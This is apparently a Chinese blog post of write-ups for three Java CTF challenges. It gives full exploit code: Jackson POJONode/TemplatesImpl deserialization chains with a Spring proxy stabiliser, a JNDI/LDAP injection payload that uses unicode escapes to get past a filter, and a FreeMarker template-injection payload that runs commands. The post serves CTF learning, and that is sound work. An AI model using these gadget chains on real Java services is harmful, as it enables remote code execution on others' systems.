# Java-CTF(2)

  
  
&lt;!--more--&gt;  
# 2023巅峰极客 BabyURL  
## 0x01 解题记录  
`hack`路由下存在反序列化入口  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411171549237.png)
加了一些过滤  
```java  
String[] denyClasses = new String[]{&#34;java.net.InetAddress&#34;, &#34;org.apache.commons.collections.Transformer&#34;, &#34;org.apache.commons.collections.functors&#34;, &#34;com.yancao.ctf.bean.URLVisiter&#34;, &#34;com.yancao.ctf.bean.URLHelper&#34;};  
```  
看一下 lib  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411171550641.png)
这里存在`Jackson`直接打`POJONode`触发`TemplatesImpl`即可  
需要注意的点仍然是需要重写`com.fasterxml.jackson.databind.node.BaseJsonNode`类  
并且注释掉`writeReplace()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411171559769.png)
构造`exp`  
```java  
import com.fasterxml.jackson.databind.node.POJONode;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;    
import javassist.CannotCompileException;    
import javassist.ClassPool;     
import javassist.CtClass;    
import javassist.NotFoundException;    
    
import javax.management.BadAttributeValueExpException;    
import java.io.ByteArrayOutputStream;    
import java.io.IOException;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import java.util.Base64;    
import java.util.UUID;    
    
public class Poc {    
    public static void main(String[] args) throws Exception{    
        byte[] code = getTemplates();    
        byte[][] codes = {code};    
        // TemplatesImpl    
        TemplatesImpl templates = new TemplatesImpl();    
        setFieldValue(templates, &#34;_name&#34;, &#34;useless&#34;);    
        setFieldValue(templates, &#34;_tfactory&#34;,  new TransformerFactoryImpl());    
        setFieldValue(templates, &#34;_bytecodes&#34;, codes);    
    
        POJONode node = new POJONode(templates);    
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);    
        setFieldValue(val,&#34;val&#34;,node);    
        System.out.println(serialize(val));    
    }    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    
        objectOutputStream.writeObject(object);    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
    public static byte[] getTemplates() throws CannotCompileException, IOException, NotFoundException {    
        ClassPool classPool = ClassPool.getDefault();    
        // 生成一个随机的类名    
        String randomClassName = &#34;Test_&#34; &#43; UUID.randomUUID().toString().replace(&#34;-&#34;, &#34;&#34;);    
        CtClass ctClass = classPool.makeClass(randomClassName);    
        ctClass.setSuperclass(classPool.get(&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;));    
        String block = &#34;Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;;    
        ctClass.makeClassInitializer().insertBefore(block);    
        return ctClass.toBytecode();    
    }    
}  
```  
当我们攻击的时候，可能会出现如下错误  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411171707627.png)
这是因为 Jackson 的链子并不稳定，所以需要绕过一下  
https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/  
稳定版exp  
```java  
import com.fasterxml.jackson.databind.node.POJONode;    
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import javassist.*;    
import org.springframework.aop.framework.AdvisedSupport;    
import javax.management.BadAttributeValueExpException;    
import javax.xml.transform.Templates;    
import java.io.*;    
import java.lang.reflect.*;    
import java.util.Base64;    
    
import java.util.UUID;    
    
public class Poc {    
    public static void main(String[] args) throws Exception{    
        byte[] code = getTemplates();    
        byte[][] codes = {code};    
        // TemplatesImpl    
        TemplatesImpl templates = new TemplatesImpl();    
        setFieldValue(templates, &#34;_name&#34;, &#34;useless&#34;);    
        setFieldValue(templates, &#34;_tfactory&#34;,  null);    
        setFieldValue(templates, &#34;_bytecodes&#34;, codes);    
    
        //利用 JdkDynamicAopProxy 进行封装使其稳定触发    
        Class&lt;?&gt; clazz = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;);    
        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);    
        cons.setAccessible(true);    
        AdvisedSupport advisedSupport = new AdvisedSupport();    
        advisedSupport.setTarget(templates);    
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);    
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);    
    
        POJONode node = new POJONode(proxyObj);    
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);    
        setFieldValue(val,&#34;val&#34;,node);    
        System.out.println(serialize(val));    
    }    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    
        objectOutputStream.writeObject(object);    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
    public static byte[] getTemplates() throws CannotCompileException, IOException, NotFoundException {    
        ClassPool classPool = ClassPool.getDefault();    
        // 生成一个随机的类名    
        String randomClassName = &#34;Test_&#34; &#43; UUID.randomUUID().toString().replace(&#34;-&#34;, &#34;&#34;);    
        CtClass ctClass = classPool.makeClass(randomClassName);    
        ctClass.setSuperclass(classPool.get(&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;));    
        String block = &#34;Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;;    
        ctClass.makeClassInitializer().insertBefore(block);    
        return ctClass.toBytecode();    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411171713490.png)
# 2024RCTF-OpenYourEyesToSeeTheWorld  
## 0x01 解题记录  
通过源码，得知是 JNDI 注入  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411172258179.png)
这里动态调试一下`search()`函数  
进入到`p_search()`方法中  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411191609995.png)
进入到`p_resolveIntermediate()`方法中  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411191610271.png)
进入到`c_resolveIntermediate_nns()`方法中，就可以看到`c_lookup()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411191611594.png)
跟进就可以看到有`decodeObject()`方法进行反序列化  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411191612766.png)
进入到`c_resolveIntermediate_nns()`方法的前提是`Head`或者`Tail`不为空即可，这里有过滤，但支持`unicode`解码，所以可以利用`unicode`编码绕过  
这里直接用`Jackson`的链子  
https://github.com/kxcode/JNDI-Exploit-Bypass-Demo  
构造`exp`  
```java  
import com.fasterxml.jackson.databind.node.POJONode;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import javassist.*;    
import org.springframework.aop.framework.AdvisedSupport;    
import javax.management.BadAttributeValueExpException;    
import javax.xml.transform.Templates;    
import java.io.*;    
import java.lang.reflect.*;    
import java.util.Base64;    
    
import java.util.UUID;    
    
public class Poc {    
    public static void main(String[] args) throws Exception{    
        byte[] code = getTemplates();    
        byte[][] codes = {code};    
        // TemplatesImpl    
        TemplatesImpl templates = new TemplatesImpl();    
        setFieldValue(templates, &#34;_name&#34;, &#34;useless&#34;);    
        setFieldValue(templates, &#34;_tfactory&#34;,  null);    
        setFieldValue(templates, &#34;_bytecodes&#34;, codes);    
    
        //利用 JdkDynamicAopProxy 进行封装使其稳定触发    
        Class&lt;?&gt; clazz = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;);    
        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);    
        cons.setAccessible(true);    
        AdvisedSupport advisedSupport = new AdvisedSupport();    
        advisedSupport.setTarget(templates);    
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);    
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);    
    
        POJONode node = new POJONode(proxyObj);    
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);    
        setFieldValue(val,&#34;val&#34;,node);    
        System.out.println(serialize(val));    
    }    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    
        objectOutputStream.writeObject(object);    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
    public static byte[] getTemplates() throws CannotCompileException, IOException, NotFoundException {    
        ClassPool classPool = ClassPool.getDefault();    
        // 生成一个随机的类名    
        String randomClassName = &#34;Test_&#34; &#43; UUID.randomUUID().toString().replace(&#34;-&#34;, &#34;&#34;);    
        CtClass ctClass = classPool.makeClass(randomClassName);    
        ctClass.setSuperclass(classPool.get(&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;));    
        String block = &#34;Runtime.getRuntime().exec(\&#34;touch /tmp/success\&#34;);&#34;;    
        ctClass.makeClassInitializer().insertBefore(block);    
        return ctClass.toBytecode();    
    }    
}  
```  
exp 放入下面的`HackerLDAPRefServer.java`中  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411191854628.png)
payload  
```json  
{  
	&#34;ip&#34;:&#34;10.216.7.79&#34;,  
	&#34;port&#34;:1099,  
&#34;searchBase&#34;:&#34;dc\u003djavasec,dc\u003deki,dc\u003dxyz\u002f0&#34;,  
	&#34;filter&#34;:&#34;\u0028cn\u003dtest\u0029&#34;}  
```  
攻击成功  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411191855895.png)
# 2023羊城杯 Ez_java  
## 0x01 解题记录  
`sink`点在`HtmlMap#get()`方法处  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411202346588.png)
这里可以直接调用`HtmlUploadUtil#uploadfile()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411202347993.png)
可以写入`ftl`文件，此文件存在模版注入，payload 如下  
```java  
&lt;!DOCTYPE html&gt;&lt;html lang=\&#34;en\&#34;&gt;&lt;head&gt;&lt;metacharset=\&#34;UTF-8\&#34;&gt;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;&lt;#assign fc=ac.getBean(&#39;freeMarkerConfiguration&#39;)&gt;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;${\&#34;freemarker.template.utility.Execute\&#34;?new()(\&#34;touch /tmp/pwned\&#34;)}&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;  
```  
如何调用到`get()`方法，在`HtmlInvocationHandler`写了一个动态代理类,其中`invoke`方法，可以直接调用到`get()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411202350967.png)
这里直接用`java.reflect.Proxy`做一个代理，构造`exp`  
```java  
import com.ycbjava.Utils.HtmlInvocationHandler;    
import com.ycbjava.Utils.HtmlMap;    
    
import javax.management.BadAttributeValueExpException;    
import java.io.ByteArrayOutputStream;    
import java.io.IOException;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import java.lang.reflect.Proxy;    
import java.util.Base64;    
import java.util.Map;    
    
public class Poc {    
    public static void main(String[] args) throws Exception{    
        HtmlMap htmlMap = new HtmlMap();    
        htmlMap.filename = &#34;index.ftl&#34;;    
        htmlMap.content = &#34;&lt;!DOCTYPE html&gt;&lt;html lang=\\\&#34;en\\\&#34;&gt;&lt;head&gt;&lt;metacharset=\\\&#34;UTF-8\\\&#34;&gt;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;&lt;#assign fc=ac.getBean(&#39;freeMarkerConfiguration&#39;)&gt;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;${\\\&#34;freemarker.template.utility.Execute\\\&#34;?new()(\\\&#34;touch /tmp/pwned\\\&#34;)}&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;&#34;;    
        Map proxyMap = (Map) Proxy.newProxyInstance(Poc.class.getClassLoader(), new Class[]{Map.class}, new HtmlInvocationHandler(htmlMap));    
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);    
        setFieldValue(badAttributeValueExpException,&#34;val&#34;,proxyMap);    
        System.out.println(serialize(badAttributeValueExpException));    
    }    
    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    
        objectOutputStream.writeObject(object);    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
}  
```  
  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/java-ctf2/  

